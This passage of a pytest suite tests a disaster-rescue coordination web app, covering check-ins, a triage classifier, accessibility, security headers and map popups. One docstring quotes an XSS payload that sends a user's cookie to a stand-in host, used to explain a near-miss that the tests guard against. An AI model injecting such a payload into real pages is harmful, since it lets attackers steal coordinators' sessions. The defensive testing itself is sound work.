        old = (datetime.now(timezone.utc) - timedelta(days=365)).isoformat()
        res = client.post("/api/checkin", json={"lat": 29.7, "lng": -95.8,
                                                "happened_at": old})
        assert res.status_code == 400

    def test_a_timestamp_that_is_not_a_timestamp(self, client):
        client.post("/report/1/rescue")
        res = client.post("/api/checkin", json={"happened_at": "yesterday-ish"})
        assert res.status_code == 400

    def test_triage_with_nothing_answered(self, client):
        assert client.post("/api/triage", json={}).status_code == 400

    def test_triage_with_a_word_where_a_number_goes(self, client):
        res = client.post("/api/triage", json={
            "can_walk": "false", "breathing": "true",
            "respiratory_rate": "fast"})
        assert res.status_code == 400

    def test_a_report_id_that_is_not_a_number(self, client):
        assert client.get("/report/banana").status_code == 404

    def test_a_negative_report_id(self, client):
        assert client.get("/report/-1").status_code == 404

    def test_every_page_survives_an_empty_database(self, client):
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("DELETE FROM assignments")
            db.execute("DELETE FROM report_flags")
            db.execute("DELETE FROM reports")
            db.commit()
        for page in ["/", "/map", "/board", "/triage", "/export/ics214"]:
            assert client.get(page).status_code == 200, page


class TestQueuedCheckinIds:
    """A queued check-in gets retried whenever the signal flickers. Sending
    the same one twice has to be free, or a bad connection fills the log with
    duplicates of somebody standing still."""

    def count(self):
        with diresq.app.app_context():
            return diresq.get_db().execute(
                "SELECT COUNT(*) c FROM checkins").fetchone()["c"]

    def test_the_same_check_in_twice_writes_one_row(self, client):
        payload = {"lat": 29.78, "lng": -95.82, "client_id": "abc-123"}
        first = client.post("/api/checkin", json=payload)
        second = client.post("/api/checkin", json=payload)
        assert first.status_code == 201
        assert second.status_code == 200
        assert self.count() == 1

    def test_a_retry_is_told_it_is_a_retry(self, client):
        payload = {"lat": 29.78, "lng": -95.82, "client_id": "abc-123"}
        client.post("/api/checkin", json=payload)
        body = client.post("/api/checkin", json=payload).get_json()
        assert body["duplicate"] is True
        assert body["ok"] is True

    def test_a_retry_keeps_the_original_time(self, client):
        # Otherwise a resend would quietly reset the overdue timer to now,
        # which is the exact bug backdating exists to prevent.
        payload = {"lat": 29.78, "lng": -95.82, "client_id": "abc-123",
                   "happened_at": ago(minutes=40)}
        first = client.post("/api/checkin", json=payload).get_json()
        second = client.post("/api/checkin", json=payload).get_json()
        assert first["at"] == second["at"]

    def test_different_ids_are_different_check_ins(self, client):
        for n in range(3):
            client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82,
                                              "client_id": f"id-{n}"})
        assert self.count() == 3

    def test_a_check_in_with_no_id_still_works(self, client):
        # Nothing that came through the queue, e.g. a plain form post with
        # JavaScript switched off.
        assert client.post("/api/checkin",
                           json={"lat": 29.78, "lng": -95.82}).status_code == 201

    def test_check_ins_without_ids_are_never_treated_as_duplicates(self, client):
        for _ in range(3):
            client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82})
        assert self.count() == 3

    def test_you_cannot_reuse_somebody_elses_id(self, client):
        client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82,
                                          "client_id": "taken"})
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE checkins SET responder = 2 WHERE client_id = 'taken'")
            db.commit()

        res = client.post("/api/checkin", json={"lat": 29.1, "lng": -95.1,
                                                "client_id": "taken"})
        assert res.status_code == 409
        assert self.count() == 1

    def test_it_reads_the_timestamp_a_browser_actually_sends(self, client):
        # new Date().toISOString() ends in Z, and Python only learned to read
        # that in 3.11. Without handling it here, every queued check-in would
        # work on a new laptop and be rejected in deployment.
        res = client.post("/api/checkin", json={
            "lat": 29.78, "lng": -95.82, "client_id": "js-1",
            "happened_at": "2026-08-02T07:00:00.000Z".replace(
                "2026-08-02T07:00:00", ago(minutes=20).replace("+00:00", ""))})
        assert res.status_code == 201

    def test_a_plain_z_timestamp_is_read_too(self):
        assert diresq.parse_iso("2026-08-02T07:00:00Z") is not None
        assert diresq.parse_iso("2026-08-02T07:00:00.000Z") is not None
        assert diresq.parse_iso("2026-08-02T07:00:00+00:00") is not None
        assert diresq.parse_iso("half past four") is None

    def test_a_silly_long_id_is_trimmed_not_rejected(self, client):
        res = client.post("/api/checkin", json={"lat": 29.78, "lng": -95.82,
                                                "client_id": "x" * 5000})
        assert res.status_code == 201

    def test_a_retry_does_not_un_expire_a_stale_check_in(self, client):
        # The queue keeps the time it was made, so resending an old one must
        # not make it look recent.
        client.post("/report/1/rescue")
        payload = {"lat": 29.78, "lng": -95.82, "client_id": "old",
                   "happened_at": ago(minutes=90)}
        client.post("/api/checkin", json=payload)
        client.post("/api/checkin", json=payload)

        board = client.get("/api/responders").get_json()
        mine = next(r for r in board if r["username"] == "londo")
        assert mine["overdue"] is True


class TestTheDocsAreNotOutOfDate:
    """Numbers in prose rot silently. Every one of these was wrong at least
    once before this test existed."""

    def counted(self, name):
        """Pull "251 test functions" or "24 routes" out of the docs."""
        readme = (diresq.SCHEMA.parent / "README.md").read_text(encoding="utf-8")
        arch = (diresq.SCHEMA.parent / "docs" / "architecture.md").read_text(
            encoding="utf-8")
        found = re.findall(rf"(\d+)\s+{name}", readme + arch)
        assert found, f"no '<number> {name}' claim found in the docs"
        return {int(n) for n in found}

    def test_the_test_count_is_true(self):
        source = Path(__file__).read_text(encoding="utf-8")
        actual = len(re.findall(r"^\s*def test_", source, re.M))
        assert self.counted("test functions") == {actual}, (
            f"docs claim a test count that isn't {actual}")

    def test_the_badge_agrees_with_the_prose(self):
        # The badge is an image URL, so it doesn't match the prose pattern and
        # sat at 159 for a hundred commits.
        source = Path(__file__).read_text(encoding="utf-8")
        actual = len(re.findall(r"^\s*def test_", source, re.M))
        readme = (diresq.SCHEMA.parent / "README.md").read_text(encoding="utf-8")
        badge = re.search(r"badge/tests-(\d+)%20passing", readme)
        assert badge, "the tests badge is gone from the README"
        assert int(badge.group(1)) == actual, (
            f"badge says {badge.group(1)}, there are {actual}")

    def test_the_readme_does_not_still_deny_features_that_exist(self):
        # Every one of these shipped after the sentence claiming it hadn't.
        readme = (diresq.SCHEMA.parent / "README.md").read_text(encoding="utf-8")
        for gone in ["neither is the browser offline queue",
                     "The offline queue is not"]:
            assert gone not in readme, f"README still says: {gone}"

    def test_the_route_count_is_true(self):
        source = (diresq.SCHEMA.parent / "app.py").read_text(encoding="utf-8")
        actual = len(re.findall(r"^@app\.(?:get|post|route)", source, re.M))
        assert self.counted("routes") == {actual}, (
            f"docs claim a route count that isn't {actual}")

    def test_the_table_count_is_true(self):
        sql = diresq.SCHEMA.read_text(encoding="utf-8")
        actual = len(re.findall(r"CREATE TABLE (\w+)", sql))
        assert actual == 5, "docs say five tables in several places"

    def test_the_documented_packet_size_is_the_real_one(self):
        # The packet grew from 14 to 18 to 22 bytes as it gained a signature
        # and then a counter, and six documents claimed the old number each
        # time. This is cheaper than remembering.
        actual = transport.LAYOUT.size + transport.SIGNATURE_BYTES
        words = {14: "fourteen", 18: "eighteen", 22: "twenty-two"}
        root = diresq.SCHEMA.parent
        for name in ["docs/api.md", "docs/offline.md", "docs/decisions.md",
                     "README.md"]:
            text = (root / name).read_text(encoding="utf-8").lower()
            for size, word in words.items():
                if size == actual:
                    continue
                assert f"{size} signed bytes" not in text, f"{name}: {size}"
                assert f"{word} bytes total" not in text, f"{name}: {word}"

    def test_the_licence_is_named_consistently(self):
        # The licence changed from MIT to Apache-2.0 before the hackathon and
        # two files went on saying MIT for a week.
        root = diresq.SCHEMA.parent
        assert "Apache License" in (root / "LICENSE").read_text(encoding="utf-8")
        for name in ["docs/disclaimer.md", "templates/disclaimer.html",
                     "CITATION.cff"]:
            body = (root / name).read_text(encoding="utf-8")
            assert "MIT" not in body, f"{name} still says MIT"


class TestAccessibility:
    """WCAG 2.1 AA basics, checked in the markup. An audit nobody can rerun
    is a claim, not a result."""

    PAGES = ["/", "/board", "/map", "/triage", "/report/1", "/report/new",
             "/login", "/signup", "/disclaimer", "/credits"]

    @pytest.mark.parametrize("page", PAGES)
    def test_every_page_declares_its_language(self, client, page):
        assert 'lang="en"' in client.get(page).get_data(as_text=True)

    @pytest.mark.parametrize("page", PAGES)
    def test_every_page_can_be_skipped_into(self, client, page):
        # Without this, a keyboard user tabs the whole nav on every page.
        body = client.get(page).get_data(as_text=True)
        assert 'class="skip-link" href="#main"' in body
        assert 'id="main"' in body, f"{page} has no main landmark to skip to"

    @pytest.mark.parametrize("page", PAGES)
    def test_every_page_loads_the_focus_styles(self, client, page):
        assert "a11y.css" in client.get(page).get_data(as_text=True)

    @pytest.mark.parametrize("page", PAGES)
    def test_no_image_is_missing_alt_text(self, client, page):
        body = client.get(page).get_data(as_text=True)
        for tag in re.findall(r"<img\b[^>]*>", body):
            assert "alt=" in tag, f"{page}: {tag}"

    @pytest.mark.parametrize("page", ["/login", "/signup", "/", "/map"])
    def test_no_input_relies_on_a_placeholder_for_its_name(self, client, page):
        """Placeholders vanish as soon as you type and screen readers may not
        announce them at all."""
        body = client.get(page).get_data(as_text=True)
        labelled = set(re.findall(r'<label[^>]*\bfor="([^"]+)"', body))
        for tag in re.findall(r"<input\b[^>]*>", body):
            if re.search(r'type="(hidden|checkbox|radio|submit)"', tag):
                continue
            ident = re.search(r'id="([^"]+)"', tag)
            named = (ident and ident.group(1) in labelled) or "aria-label" in tag
            assert named, f"{page}: unlabelled input {tag}"

    def test_the_board_announces_changes_without_shouting(self, client):
        # It repaints every three seconds. assertive would interrupt a screen
        # reader mid-sentence on every poll.
        body = client.get("/board").get_data(as_text=True)
        assert 'aria-live="polite"' in body
        assert 'aria-live="assertive"' not in body

    def test_errors_are_announced(self, anon):
        body = anon.post("/login", data={"username": "x", "password": "y"}
                         ).get_data(as_text=True)
        assert 'role="alert"' in body

    def test_contrast_of_the_colours_we_rely_on(self):
        """Every foreground/background pair used for real text, against the
        4.5:1 that WCAG AA asks for."""
        def luminance(hex_colour):
            hex_colour = hex_colour.lstrip("#")
            channels = [int(hex_colour[i:i + 2], 16) / 255 for i in (0, 2, 4)]
            adjusted = [c / 12.92 if c <= 0.03928 else ((c + 0.055) / 1.055) ** 2.4
                        for c in channels]
            return (0.2126 * adjusted[0] + 0.7152 * adjusted[1]
                    + 0.0722 * adjusted[2])

        def ratio(fg, bg):
            light, dark = sorted([luminance(fg), luminance(bg)], reverse=True)
            return (light + 0.05) / (dark + 0.05)

        base, surface = "#1e1e2e", "#313244"
        pairs = [
            ("body", "#cdd6f4", base), ("body on surface", "#cdd6f4", surface),
            ("muted", "#a6adc8", base), ("muted on surface", "#a6adc8", surface),
            ("link", "#89b4fa", base), ("ok", "#a6e3a1", base),
            ("overdue", "#f38ba8", base),
            ("overdue on surface", "#f38ba8", surface),
            ("warning", "#fab387", base), ("caution", "#f9e2af", surface),
        ]
        for name, fg, bg in pairs:
            assert ratio(fg, bg) >= 4.5, (
                f"{name}: {ratio(fg, bg):.2f}:1, needs 4.5:1")

    def test_the_palette_file_does_not_reintroduce_the_unreadable_greys(self):
        # #45475a on #313244 is 1.8:1. It was being used for capability tags.
        css = (diresq.SCHEMA.parent / "static" / "styles" / "a11y.css"
               ).read_text(encoding="utf-8")
        assert "#a6adc8 !important" in css, "the contrast override is gone"


class TestClassifier:
    """The suggestion model. Deterministic, so every one of these is exact —
    there is no 'usually' in a test suite."""

    def test_a_trapped_person_reads_as_high(self):
        assert classify.suggest(
            "water rising fast, grandmother upstairs and cannot walk down"
        ).priority == "HIGH"

    def test_an_inconvenience_reads_as_low(self):
        assert classify.suggest(
            "mailbox blew over in the wind, no other damage, just reporting"
        ).priority == "LOW"

    def test_something_in_between_reads_as_medium(self):
        assert classify.suggest(
            "tree came down across the driveway, nobody hurt, car is stuck"
        ).priority == "MEDIUM"

    def test_it_says_what_equipment_is_needed(self):
        assert "boat" in classify.suggest(
            "family on the roof, water at the second floor windows").capabilities
        assert "chainsaw" in classify.suggest(
            "large tree fell across the drive, need it cut up").capabilities

    def test_it_explains_itself(self):
        # A coordinator deciding where to send a boat is owed a reason.
        result = classify.suggest(
            "man collapsed and is unresponsive, ambulance cannot reach us")
        assert result.reasons, "no explanation given"
        assert all(isinstance(word, str) for word in result.reasons)

    def test_it_declines_to_guess_at_two_words(self):
        result = classify.suggest("help please")
        assert result.confident is False
        assert result.confidence == 0.0

    def test_it_declines_on_empty_input(self):
        assert classify.suggest("").confident is False
        assert classify.suggest(None).confident is False

    def test_confidence_is_a_probability(self):
        for text, _, _ in classify.CORPUS[:10]:
            assert 0.0 <= classify.suggest(text).confidence <= 1.0

    def test_the_same_text_always_gives_the_same_answer(self):
        text = "water coming under the door, elderly resident alone downstairs"
        answers = {classify.suggest(text).priority for _ in range(20)}
        assert len(answers) == 1, "the model is not deterministic"

    def test_it_survives_junk(self):
        for junk in ["", "   ", "!!!!", "123 456", "ᚠᚢᚦ", "<script>x</script>"]:
            classify.suggest(junk)   # must not raise

    def test_a_restatement_is_flagged_as_a_duplicate(self):
        existing = [{"id": 1, "subject": "Water rising, two adults upstairs",
                     "description": "Water was at the porch, now inside. "
                                    "They have gone to the second floor."}]
        found = classify.duplicates(
            "water rising in the house, two people have gone upstairs", existing)
        assert found and found[0]["id"] == 1

    def test_a_different_incident_is_not(self):
        existing = [{"id": 1, "subject": "Water rising, two adults upstairs",
                     "description": "They have gone to the second floor."}]
        assert classify.duplicates(
            "mailbox blew over in the wind", existing) == []

    def test_the_threshold_clears_the_worst_real_false_positive(self):
        # Measured against the seeded reports: 0.157 was the highest score
        # between two genuinely different ones.
        assert classify.DUPLICATE_THRESHOLD > 0.157

    def test_the_model_card_admits_what_it_cannot_do(self):
        card = classify.model_card()
        assert card["limits"], "a model card with no limits is marketing"
        assert card["trained_on"]

    def test_every_corpus_label_is_a_real_priority(self):
        for text, label, caps in classify.CORPUS:
            assert label in classify.PRIORITIES, f"bad label on {text!r}"
            for cap in caps:
                assert cap in classify.CAPABILITIES, f"bad capability {cap!r}"

    def test_the_corpus_is_not_lopsided(self):
        # A class with far fewer examples gets quietly under-predicted.
        counts = Counter(label for _, label, _ in classify.CORPUS)
        assert min(counts.values()) >= len(classify.CORPUS) / 6


class TestEquipmentLexicon:
    """Equipment is matched by vocabulary, not by the classifier. These are
    the cases that made us change approach."""

    def needs(self, text):
        return classify.suggest(text).capabilities

    def test_water_means_a_boat(self):
        assert "boat" in self.needs(
            "water rising, two adults have gone upstairs")

    def test_a_tree_means_a_chainsaw(self):
        assert "chainsaw" in self.needs("tree down across the driveway")

    def test_a_power_cut_means_a_generator(self):
        assert "generator" in self.needs(
            "no power since last night, freezer thawing")

    def test_a_power_line_does_not_mean_a_chainsaw(self):
        # The bug that killed the per-capability classifier: one training
        # line mentioned a branch on a power line, so "power line down,
        # sparking" came back needing a chainsaw at 100% confidence.
        assert "chainsaw" not in self.needs(
            "power line down across both lanes, still arcing, no trees")

    def test_it_never_asks_for_everything(self):
        # A report that appears to need all five is a report the model has
        # not understood.
        long_report = ("water rising and a tree came down and the power is "
                       "out and somebody is hurt and we need supplies")
        assert len(self.needs(long_report)) <= 2

    def test_do_not_send_anyone_means_nothing_is_needed(self):
        assert self.needs(
            "fence down, two dogs loose. Please do not send anyone.") == []

    def test_it_names_the_word_that_matched(self):
        result = classify.suggest("tree across the driveway, chainsaw job")
        assert result.equipment_reasons.get("chainsaw")


class TestTheExplanationIsReadable:
    """The model counts stems. The person reads words.

    This shipped showing the stems: "Suggested from: ris, upstair, fast",
    which reads like three typos. The whole point of showing the reasons is
    that somebody can look at them and disagree, and nobody disagrees with
    something they think is a bug.
    """

    def test_every_reason_is_a_word_the_person_typed(self):
        for text, _priority, _needed in classify.CORPUS:
            for reason in classify.suggest(text).reasons:
                assert reason in text.lower(), (
                    f"{reason!r} is not in {text!r} — the explanation has "
                    f"stopped matching what was written")

    def test_stems_are_mapped_back(self):
        # "rising" stems to "ris", which is not a word.
        reasons = classify.suggest(
            "Water rising fast, grandmother upstairs, she cannot walk down"
        ).reasons
        assert "ris" not in reasons
        assert "rising" in reasons

    def test_the_stemmer_still_stems(self):
        # The refactor that fixed the display must not have broken matching:
        # every inflection still has to land on one token.
        assert classify.tokenise("flooding floods flooded") == [
            "flood", "flood", "flood"]

    def test_tokenise_and_surface_forms_agree(self):
        # If these drift, the explanation stops describing the decision.
        for text, _p, _n in classify.CORPUS:
            forms = classify.surface_forms(text)
            for stem in classify.tokenise(text):
                assert stem in forms, f"{stem!r} has no surface form"

    def test_the_example_in_the_docs_is_what_the_code_returns(self):
        """docs/model.md prints a worked example. Run it.

        It was wrong for a while — a confidence and a set of reasons that
        belonged to a different sentence than the one quoted above them. It
        reached the demo video that way, because prose does not get executed
        and nobody checks a code block that looks like an illustration.
        """
        page = (diresq.SCHEMA.parent / "docs" / "model.md"
                ).read_text(encoding="utf-8")

        quoted = re.search(r'^> \*"(.+?)"\*', page, re.M | re.S)
        assert quoted, "the worked example is gone from model.md"
        sentence = " ".join(quoted.group(1).split())

        block = re.search(
            r"```\n(HIGH|MEDIUM|LOW) . (\d+)% sure . (\w+)\n"
            r"Suggested from: ([^.]+)\.", page)
        assert block, "the worked example no longer has a result block"

        result = classify.suggest(sentence)
        assert result.priority == block.group(1)
        assert round(result.confidence * 100) == int(block.group(2))
        assert block.group(3) in result.capabilities
        assert [r.strip() for r in block.group(4).split(",")] == result.reasons


class TestTheClassifierIsMeasuredNotAssumed:
    """Hold out one report, retrain on the rest, predict the held-out one.

    This exists because the obvious way to check a classifier — run it over
    the corpus it was trained on — reported 100% and was meaningless. Held
    out properly, naive Bayes alone got 45%, against 36% for always guessing
    HIGH, and it called "child not breathing properly" a MEDIUM.

    That is what put the severity lexicon in. These tests are the guard rail:
    if somebody improves the model and the held-out number drops, they find
    out here rather than in a disaster.
    """

    @staticmethod
    def loocv(use_lexicon=True):
        right = 0
        for i, (text, gold, _needed) in enumerate(classify.CORPUS):
            model = classify.NaiveBayes(classify.PRIORITIES)
            for j, (other, label, _n) in enumerate(classify.CORPUS):
                if j != i:
                    model.learn(other, label)

            stated = classify.severity_for(text) if use_lexicon else None
            if stated is not None:
                predicted = stated[0]
            else:
                scores = model.scores(text)
                predicted = max(scores, key=scores.get)

            right += predicted == gold
        return right / len(classify.CORPUS)

    @staticmethod
    def majority_baseline():
        counts = Counter(label for _t, label, _n in classify.CORPUS)
        return counts.most_common(1)[0][1] / len(classify.CORPUS)

    def test_it_beats_guessing_the_most_common_class(self):
        measured, baseline = self.loocv(), self.majority_baseline()
        assert measured > baseline + 0.25, (
            f"held-out {measured:.0%} vs {baseline:.0%} for always guessing "
            f"the commonest label — the model is barely earning its place")

    def test_it_has_not_regressed(self):
        # Measured at 75% when the severity lexicon went in. The floor is set
        # below that so ordinary corpus edits don't fail the build, but a real
        # regression will.
        assert self.loocv() >= 0.68

    def test_the_lexicon_is_what_makes_the_difference(self):
        # If these ever converge, the lexicon has stopped doing anything and
        # somebody should find out why before deleting it.
        assert self.loocv(True) > self.loocv(False) + 0.15

    def test_the_lexicon_never_contradicts_a_labelled_report(self):
        # A phrase that fires on a report labelled something else is a phrase
        # that is too blunt. "cannot get out" was exactly this — it matched
        # "cannot get the car out" and called a blocked driveway a HIGH.
        wrong = [
            (label, stated[1], text)
            for text, label, _needed in classify.CORPUS
            if (stated := classify.severity_for(text)) and stated[0] != label
        ]
        assert not wrong, f"lexicon overrides a label: {wrong}"

    def test_the_corpus_is_the_size_the_docs_claim(self):
        # The docs said 65 for a while. It was 55. Nobody noticed because
        # nothing checked.
        claimed = re.findall(
            r"(\d+)\s+(?:hand-)?labelled reports",
            (diresq.SCHEMA.parent / "docs" / "model.md"
             ).read_text(encoding="utf-8"))
        assert claimed, "model.md no longer states a corpus size"
        for number in claimed:
            assert int(number) == len(classify.CORPUS)


class TestCapabilityMatching:
    """The classifier says a boat is needed; the board knows who has one.
    Before this they never met."""

    def test_it_names_available_responders_with_the_equipment(self, client):
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE accounts SET capabilities = 'boat' "
                       "WHERE username = 'skythe'")
            db.commit()
        with diresq.app.test_request_context("/"):
            diresq.session["user_id"] = 1
            report = diresq.fetch_report(1)
        boats = next((m for m in report["matches"]
                      if m["capability"] == "boat"), None)
        assert boats and "skythe" in boats["responders"]

    def test_somebody_already_out_is_not_offered(self, client):
        # Offering a person who is on another job is how you pull somebody
        # off a scene they were needed at.
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE accounts SET capabilities = 'boat' "
                       "WHERE username = 'skythe'")
            db.commit()
        client.post("/report/2/rescue")   # londo takes report 2

        with diresq.app.test_request_context("/"):
            diresq.session["user_id"] = 1
            report = diresq.fetch_report(1)
        for match in report["matches"]:
            assert "londo" not in match["responders"]

    def test_nobody_free_is_reported_rather_than_hidden(self, client):
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE accounts SET capabilities = ''")
            db.commit()
        body = client.get("/report/1").get_data(as_text=True)
        if "What this needs" in body:
            assert "nobody free has this" in body

    def test_reporters_are_never_offered(self, client):
        # kiyan is a reporter, not a responder, whatever their capabilities
        # column happens to say.
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE accounts SET capabilities = 'boat' "
                       "WHERE username = 'kiyan'")
            db.commit()
        with diresq.app.test_request_context("/"):
            diresq.session["user_id"] = 1
            report = diresq.fetch_report(1)
        for match in report["matches"]:
            assert "kiyan" not in match["responders"]

    def test_it_says_it_is_a_suggestion(self, client):
        body = client.get("/report/1").get_data(as_text=True)
        if "What this needs" in body:
            assert "not an assignment" in " ".join(body.split())

    def test_no_equipment_means_no_block(self, client):
        with diresq.app.app_context():
            db = diresq.get_db()
            db.execute("UPDATE reports SET subject = 'Note', "
                       "description = 'Reporting for the record only.' "
                       "WHERE id = 1")
            db.commit()
        assert client.get("/report/1").status_code == 200


class TestSuggestEndpoint:
    def test_it_answers_with_a_suggestion(self, client):
        body = client.post("/api/suggest", json={
            "text": "water rising fast, two people trapped upstairs"}).get_json()
        assert body["priority"] == "HIGH"
        assert body["confident"] is True
        assert body["reasons"]

    def test_it_flags_a_report_that_already_exists(self, client):
        # seed_minimal's first report is the same incident, worded differently.
        body = client.post("/api/suggest", json={
            "text": "water is rising, two people trapped on the second floor"
        }).get_json()
        assert body["duplicates"], "did not spot the existing report"

    def test_it_writes_nothing(self, client):
        before = count_reports()
        for _ in range(5):
            client.post("/api/suggest", json={"text": "water rising fast"})
        assert count_reports() == before

    def test_it_needs_a_login(self, anon):
        assert anon.post("/api/suggest",
                         json={"text": "water rising"}).status_code == 302

    def test_empty_input_is_not_an_error(self, client):
        res = client.post("/api/suggest", json={"text": ""})
        assert res.status_code == 200
        assert res.get_json()["confident"] is False

    def test_the_model_card_is_public(self, anon):
        card = anon.get("/api/model").get_json()
        assert "naive Bayes" in card["kind"]
        assert card["limits"]

    def test_the_report_form_loads_it(self, client):
        assert "suggest.js" in client.get("/report/new").get_data(as_text=True)


class TestDemoMode:
    """The hosted instance looks like an emergency service and isn't one."""

    @pytest.fixture
    def demo(self, tmp_path, monkeypatch):
        monkeypatch.setattr(diresq, "DATABASE", str(tmp_path / "demo.db"))
        monkeypatch.setenv("DIRESQ_DEV_USER", "londo")
        monkeypatch.setenv("DIRESQ_DEMO", "1")
        diresq.init_db()
        with diresq.app.app_context():
            diresq.seed_minimal()
        return diresq.app.test_client()

    @pytest.mark.parametrize("page", ["/", "/board", "/map", "/triage",
                                     "/login", "/signup", "/report/1",
                                     "/report/new"])
    def test_every_page_says_it_is_a_demo(self, demo, page):
        assert "demo-banner" in demo.get(page).get_data(as_text=True)

    def test_it_warns_against_typing_a_real_address(self, demo):
        # Collapsed, because the template wraps and a phrase can land either
        # side of a line break.
        body = " ".join(demo.get("/").get_data(as_text=True).split())
        assert "real address" in body
        assert "resets" in body

    def test_the_banner_is_off_by_default(self, client):
        # Nothing on a developer's machine or in CI should show it.
        assert "demo-banner" not in client.get("/").get_data(as_text=True)

    def test_the_deploy_config_does_not_bypass_auth(self):
        # DIRESQ_DEV_USER on a public instance signs every visitor in as the
        # same person. It must never appear in the hosting config.
        blueprint = (diresq.SCHEMA.parent / "render.yaml").read_text(
            encoding="utf-8")
        assert "DIRESQ_DEV_USER" not in blueprint
        assert "DIRESQ_HTTPS_ONLY" in blueprint
        assert "generateValue: true" in blueprint, "secret key must be generated"

    def test_the_deploy_config_has_no_hardcoded_secret(self):
        blueprint = (diresq.SCHEMA.parent / "render.yaml").read_text(
            encoding="utf-8")
        for line in blueprint.splitlines():
            if "DIRESQ_SECRET_KEY" in line:
                continue
            assert "secret" not in line.lower() or "generateValue" in line

    def test_the_health_check_needs_no_login(self, anon):
        # Render polls it unauthenticated. If it ever needs a session the
        # deploy never goes green.
        blueprint = (diresq.SCHEMA.parent / "render.yaml").read_text(
            encoding="utf-8")
        path = re.search(r"healthCheckPath:\s*(\S+)", blueprint).group(1)
        assert anon.get(path).status_code == 200


class TestSecurityHeaders:
    """One line each, and each closes a category. Their absence is the first
    thing an automated scanner reports."""

    @pytest.mark.parametrize("header,expected", [
        ("X-Content-Type-Options", "nosniff"),
        ("X-Frame-Options", "DENY"),
        ("Referrer-Policy", "strict-origin-when-cross-origin"),
    ])
    def test_the_simple_ones_are_set(self, client, header, expected):
        assert client.get("/").headers.get(header) == expected

    def test_scripts_may_not_be_inlined(self, client):
        # 'unsafe-inline' on script-src is what makes injected markup
        # executable. Styles need it for Leaflet; scripts never do.
        policy = client.get("/").headers["Content-Security-Policy"]
        script = [p for p in policy.split(";") if "script-src" in p][0]
        assert "unsafe-inline" not in script
        assert "unsafe-eval" not in policy

    def test_the_policy_covers_what_the_map_needs(self, client):
        policy = client.get("/map").headers["Content-Security-Policy"]
        assert "tile.openstreetmap.org" in policy
        assert "unpkg.com" in policy

    def test_nothing_may_frame_us(self, client):
        assert "frame-ancestors 'none'" in \
            client.get("/").headers["Content-Security-Policy"]

    def test_only_location_is_asked_for(self, client):
        permissions = client.get("/").headers["Permissions-Policy"]
        assert "geolocation=(self)" in permissions
        assert "camera=()" in permissions

    def test_hsts_is_absent_on_plain_http(self, client, monkeypatch):
        # Sending it from localhost pins a developer's browser to
        # https://127.0.0.1, which is a bad afternoon.
        monkeypatch.delenv("DIRESQ_HTTPS_ONLY", raising=False)
        assert "Strict-Transport-Security" not in client.get("/").headers

    def test_hsts_appears_behind_https(self, client, monkeypatch):
        monkeypatch.setenv("DIRESQ_HTTPS_ONLY", "1")
        assert "max-age=" in client.get("/").headers["Strict-Transport-Security"]

    @pytest.mark.parametrize("page", ["/", "/board", "/map", "/api/reports",
                                      "/disclaimer", "/login"])
    def test_every_response_carries_them(self, client, page):
        assert client.get(page).headers.get("X-Content-Type-Options") == "nosniff"


class TestServiceWorker:
    """Keeps map tiles you have already seen. Not an offline map."""

    def test_it_is_served_from_the_root(self, client):
        # A worker only controls pages at or below its own path. Served from
        # /static/scripts/ it would control nothing.
        res = client.get("/sw.js")
        assert res.status_code == 200
        assert "javascript" in res.headers["Content-Type"]

    def test_it_is_not_cached_for_a_year(self, client):
        assert "no-cache" in client.get("/sw.js").headers.get("Cache-Control", "")

    def test_every_page_registers_it(self, client):
        # It used to be registered from map.js, which meant somebody who
        # installed the app from the board had no offline support until they
        # happened to open the map.
        assert "/sw.js" in client.get(
            "/static/scripts/pwa.js").get_data(as_text=True)

    def test_it_does_not_bulk_download_tiles(self):
        # Pre-fetching an area is against the OSM tile usage policy and gets
        # real users blocked. If somebody adds it, this fails.
        source = (diresq.SCHEMA.parent / "static" / "scripts" / "sw.js"
                  ).read_text(encoding="utf-8")
        for banned in ["for (let z", "prefetch", "downloadArea", "seedTiles"]:
            assert banned not in source

    def test_it_caps_how_much_it_keeps(self, client):
        source = (diresq.SCHEMA.parent / "static" / "scripts" / "sw.js"
                  ).read_text(encoding="utf-8")
        assert "MAX_TILES" in source, "no cap means filling somebody's phone"

    def test_it_never_caches_the_feed(self, client):
        # A cached report list is a lie about who currently needs help.
        source = (diresq.SCHEMA.parent / "static" / "scripts" / "sw.js"
                  ).read_text(encoding="utf-8")
        assert '"/"' not in source.split("SHELL_FILES")[1].split("]")[0]
        assert "/api/" not in source.split("SHELL_FILES")[1].split("]")[0]


class TestMapPopupsDoNotRunUserText:
    """Jinja escapes everything the server renders. The map is the one place
    that builds markup in the browser instead, out of JSON, and it is the one
    place where a report subject can become a <script> tag.

    This nearly shipped: the popup was assembled with a template literal and
    dropped into bindPopup, so a report titled

        <img src=x onerror="fetch('https://elsewhere/'+document.cookie)">

    would have run in the browser of every coordinator who clicked that pin —
    and coordinators are the accounts worth stealing. The fix was to build
    the popup from text nodes. These tests are here so it stays fixed.
    """

    @staticmethod
    def source():
        return (diresq.SCHEMA.parent / "static" / "scripts" / "map.js"
                ).read_text(encoding="utf-8")

    def test_nothing_on_the_map_is_written_as_raw_html(self):
        # Matched with the leading dot so the prose in this file's own
        # comments, which has to name the thing it is warning about, doesn't
        # trip it. Real use is always a property access or a call.
        source = self.source()
        for sink in (".innerHTML", ".outerHTML", ".insertAdjacentHTML("):
            assert sink not in source, f"{sink} on the map"

    def test_the_popup_is_built_from_text_nodes(self):
        source = self.source()
        assert "createTextNode" in source or "textContent" in source, (
            "the popup is not being built as text any more")

    def test_no_user_text_is_interpolated_into_markup(self):
        # Every backtick string in the file. If one of them contains both a
        # tag and a value that came from a person typing, that is the hole.
        literals = re.findall(r"`[^`]*`", self.source(), re.S)
        from_users = ("report_subject", "username", "subject", "description")
        offenders = [
            lit for lit in literals
            if "<" in lit and any(field in lit for field in from_users)
        ]
        assert not offenders, f"user text inside markup: {offenders}"

    def test_a_failed_responder_fetch_says_so(self):
        # Without this the map renders looking complete while every responder
        # pin is silently missing, which is worse than an error.
        source = self.source()
        assert ".catch(" in source.split('fetch("/api/responders")')[1], (
            "responder positions can fail silently")


